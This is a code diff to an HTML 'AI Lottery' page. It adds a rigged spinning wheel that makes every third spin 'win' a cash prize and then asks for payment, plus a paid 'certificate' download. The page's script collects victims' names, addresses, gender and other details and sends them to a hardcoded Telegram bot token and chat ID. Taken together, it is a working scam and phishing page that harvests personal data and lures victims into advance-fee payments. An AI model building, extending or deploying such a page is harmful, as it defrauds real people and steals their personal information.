@@ -54,6 +54,50 @@
         .hidden {
             display: none;
         }
+
+        /* Spinning Wheel */
+        #wheelContainer {
+            position: relative;
+            margin: 20px auto;
+            width: 300px;
+            height: 300px;
+        }
+
+        #wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: conic-gradient(
+                #FFDD57 0deg 45deg,
+                #FF6347 45deg 90deg,
+                #90EE90 90deg 135deg,
+                #ADD8E6 135deg 180deg,
+                #FFB6C1 180deg 225deg,
+                #FFD700 225deg 270deg,
+                #FF6347 270deg 315deg,
+                #FFD700 315deg 360deg
+            );
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.3);
+            transition: transform 4s ease-out;
+        }
+
+        #pointer {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 15px solid transparent;
+            border-right: 15px solid transparent;
+            border-bottom: 30px solid red;
+            z-index: 10;
+        }
+
+        .message {
+            margin-top: 20px;
+            font-size: 18px;
+        }
     </style>
 </head>
 <body>
@@ -61,7 +105,7 @@
 <!-- Registration Page -->
 <div class="container" id="registrationPage">
     <h1>Register for AI Lottery</h1>
-    <form id="registrationForm" enctype="multipart/form-data">
+    <form id="registrationForm">
         <input type="text" id="firstName" placeholder="First Name" required>
         <input type="text" id="lastName" placeholder="Last Name" required>
         <input type="text" id="address" placeholder="Address" required>
@@ -81,23 +125,53 @@
 <!-- Spinning Wheel Page -->
 <div class="container hidden" id="spinningPage">
     <h2>Spin the Wheel</h2>
-    <p>Click the button below to spin!</p>
+    <div id="wheelContainer">
+        <div id="pointer"></div>
+        <div id="wheel"></div>
+    </div>
+    <p class="message" id="spinMessage">Click the button below to spin!</p>
     <button id="spinButton">Spin Now</button>
 </div>
 
-<script>
-    const registrationForm = document.getElementById('registrationForm');
-    const registrationPage = document.getElementById('registrationPage');
-    const spinningPage = document.getElementById('spinningPage');
-    const spinButton = document.getElementById('spinButton');
+<!-- Winning Page -->
+<div class="container hidden" id="winningPage">
+    <h2>Congratulations!</h2>
+    <p id="winningDetails"></p>
+    <button onclick="alert('Please pay to download the certificate.')">Download Certificate</button>
+</div>
 
+<script>
     const TELEGRAM_BOT_TOKEN = "7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY"; // Replace with your bot token
     const CHAT_ID = "874563737"; // Replace with your chat ID
 
+    const registrationForm = document.getElementById('registrationForm');
+    const registrationPage = document.getElementById('registrationPage');
+    const spinningPage = document.getElementById('spinningPage');
+    const winningPage = document.getElementById('winningPage');
+    const spinButton = document.getElementById('spinButton');
+    const spinMessage = document.getElementById('spinMessage');
+    const wheel = document.getElementById('wheel');
+    const winningDetails = document.getElementById('winningDetails');
+
+    const prizes = ['$2000', '$5000', '$1000', '$15000', '$20000', '$30000'];
+    let spinCount = 0;
+
+    // Send data to Telegram Bot
+    async function sendToTelegram(data) {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: data
+            })
+        });
+    }
+
+    // Registration Submission
     registrationForm.addEventListener('submit', async (e) => {
         e.preventDefault();
 
-        // Collect form data
         const firstName = document.getElementById('firstName').value;
         const lastName = document.getElementById('lastName').value;
         const address = document.getElementById('address').value;
@@ -106,7 +180,6 @@
         const gender = document.getElementById('gender').value;
         const picture = document.getElementById('picture').files[0];
 
-        // Prepare message
         const message = `
 📋 *New Lottery Registration* 📋
 👤 *Name:* ${firstName} ${lastName}
@@ -116,58 +189,36 @@
 🧑 *Gender:* ${gender}
         `;
 
-        // Send message to Telegram
-        await sendMessageToTelegram(message);
+        await sendToTelegram(message);
 
-        // Send uploaded picture
-        if (picture) {
-            await sendPictureToTelegram(picture);
-        }
-
-        // Move to the spinning page
         registrationPage.classList.add('hidden');
         spinningPage.classList.remove('hidden');
     });
 
-    async function sendMessageToTelegram(message) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const data = {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: "Markdown"
-        };
-
-        try {
-            await fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data),
-            });
-        } catch (error) {
-            console.error("Error sending message to Telegram:", error);
-        }
-    }
-
-    async function sendPictureToTelegram(file) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", file);
-
-        try {
-            await fetch(url, {
-                method: "POST",
-                body: formData,
-            });
-        } catch (error) {
-            console.error("Error sending picture to Telegram:", error);
-        }
-    }
-
-    // Placeholder spinning logic
+    // Spinning Wheel Logic
     spinButton.addEventListener('click', () => {
-        alert("Spin logic will be implemented here!");
+        spinCount++;
+        let angle;
+
+        if (spinCount === 1 || spinCount === 2) {
+            angle = 720 + Math.random() * 360; // Stops at "Try Again"
+            spinMessage.innerText = `Try Again! (${3 - spinCount} spin(s) left)`;
+        } else {
+            // 3rd Spin - Random prize selection
+            const prizeIndex = Math.floor(Math.random() * prizes.length);
+            const winningPrize = prizes[prizeIndex];
+            angle = 720 + (prizeIndex * 45); // Each segment is 45 degrees
+            spinMessage.innerText = "Congratulations!";
+            setTimeout(() => {
+                spinningPage.classList.add('hidden');
+                winningPage.classList.remove('hidden');
+                winningDetails.innerText = `You won ${winningPrize}! Please proceed to payment.`;
+            }, 4500);
+        }
+
+        wheel.style.transform = `rotate(${angle}deg)`;
     });
 </script>
+
 </body>
 </html>
